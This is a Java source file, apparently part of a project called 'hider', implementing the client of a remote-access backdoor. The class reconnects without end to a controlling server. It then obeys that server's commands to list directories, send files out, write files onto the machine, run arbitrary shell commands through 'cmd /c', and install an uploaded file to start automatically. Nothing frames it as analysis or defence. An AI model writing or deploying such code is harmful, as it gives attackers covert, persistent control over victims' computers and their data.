package com.hider;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

import javax.imageio.event.IIOReadWarningListener;

public class ConnectToZhao extends Thread {

	private static BufferedWriter outToZhao;
	public static BufferedReader inputFromZhao;
	private static Socket conn;
	public static String host;
	private static int port;

	public ConnectToZhao(String host, int port) {
		// TODO Auto-generated constructor stub

		this.host = host;
		this.port = port;

	}

	public void run() {
		while (true) {

			conn = connect(host, port);
			try {
				outToZhao = new BufferedWriter(new OutputStreamWriter(conn.getOutputStream(), "utf-8"));
				inputFromZhao = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
				outToZhao.write("client: 200 OK\r\n");
				outToZhao.flush();
				while (true) {
					String choose = inputFromZhao.readLine();
					System.out.println(choose);
					// System.out.println(choose);
					switch (choose) {
					case "server: getFiles":
						getDirs(inputFromZhao.readLine());
						break;
					case "server: download":
						// System.out.println("开始下载");
						download(inputFromZhao.readLine());
						break;
					case "server: upload":
						upload(inputFromZhao.readLine());
						break;
					case "server: cmd":
						excuteCMD(inputFromZhao.readLine());
						break;
						
					case "server: biu":
						String path = inputFromZhao.readLine();
						upload(path);
						String appName;
						int begin = path.lastIndexOf('/');
						int end = path.lastIndexOf('.');
						if(begin != -1 && end != -1) {
							appName = path.substring(begin+1, end).toUpperCase();
						}else {
							appName = path.toUpperCase();
						}
						path = path.replace('/', '\\');
						BabyHider.makeItAutoStartUp(appName, path);
						break;
						
					case "server: are you alive":
						outToZhao.write("client: i,m alive\r\n");
						outToZhao.flush();
						break;

					}
					if (choose.equals("server: leave"))
						break;

				}

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			try {
				Thread.sleep(120000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

	public static Socket connect(String host, int port) {

		while (true) {
			Socket conn;
			try {
				conn = new Socket(host, port);
				// System.out.println("连接成功");
				return conn;
			} catch (IOException e) {
				// System.err.println("连接失败,正在重连");
				try {
					Thread.sleep(6000);
				} catch (InterruptedException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
			}

		}

	}

	/**
	 * 下载文件。若下载文件错误，则发送失败报文
	 * 
	 * @param path
	 */
	public static void download(String path) {

		BufferedInputStream input = null;
		try {
			input = new BufferedInputStream(new FileInputStream(path));
			outToZhao.write("client: download ready\r\n");
			outToZhao.flush();
			// 建立一个下载的线程
			// System.out.println("健力新线程");
			// 获取下载的服务器端口
			int downloadPort = Integer.parseInt(ConnectToZhao.inputFromZhao.readLine());
			DownloadThread downloadThread = new DownloadThread(input, downloadPort);
			// 获取下载的服务器端口
			downloadThread.start();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block

			try {
				outToZhao.write("client: can,t find file\r\n");
				outToZhao.flush();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	/**
	 * 上传文件。若上传文件错误，则发送失败报文
	 * 
	 * @param path
	 */
	public static boolean upload(String path) {

		BufferedOutputStream fileOut = null;
		try {
			fileOut = new BufferedOutputStream(new FileOutputStream(path));
			// 建立文件成功，发送准备上传保温
			outToZhao.write("client: upload ready\r\n");
			outToZhao.flush();
			// 等待服务器传入上传的接口
			int uploadPort = Integer.parseInt(ConnectToZhao.inputFromZhao.readLine());
			// System.out.println(uploadPort);
			UploadThread uploadThread = new UploadThread(fileOut, uploadPort);
			uploadThread.start();
		} catch (FileNotFoundException e1) {

			// 指定文件无法建立，发送无法建立报文
			// TODO Auto-generated catch block
			try {
				outToZhao.write("client: can,t find path\r\n");
				outToZhao.flush();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return false;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}

		// 建立一个上传的线程

		return true;

	}

	/**
	 * 获取目录，若获取出错，则发送出错报文
	 * 
	 * @param path
	 */
	public static void getDirs(String path) {

		try {

			String[] files = GetSystemFiles.getFiles(path);
			// 如果获取不到文件夹 发送错误报文
			if (files == null) {
				outToZhao.write("client: dirname is wrong\r\n");
				outToZhao.flush();
			} else {
				outToZhao.write("client: get dir ready\r\n");
				outToZhao.flush();
				for (String file : files) {
					outToZhao.write(file + "\r\n");
				}
				outToZhao.write("client: end\r\n");
				outToZhao.flush();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				outToZhao.write("client: dirname is wrong\r\n");
				outToZhao.flush();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}

		}

	}

	public void excuteCMD(String command) {

		
		try {
			Process running = Runtime.getRuntime().exec("cmd /c " + command);
			outToZhao.write("cmd is running\r\n");
			outToZhao.flush();
			String result = "";
			String error = "";
			BufferedReader resultReader = new BufferedReader(
					new InputStreamReader(running.getInputStream()));
			BufferedReader errorStream = new BufferedReader(
					new InputStreamReader(running.getErrorStream()));
			String buf = "";
			while ((buf = resultReader.readLine()) != null) {
				result += (buf + "\r\n");				
			}
			while ((buf = errorStream.readLine()) != null) {
				error += (buf + "\r\n");				
			}
			outToZhao.write(result);
			if(!error.equals("")) {
				outToZhao.write(" error:" + error);
			}
			outToZhao.write("this command is over\r\n");
			outToZhao.flush();
		}  catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			try {
				outToZhao.write("something is wrong");
				outToZhao.flush();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
		} 

	}

}
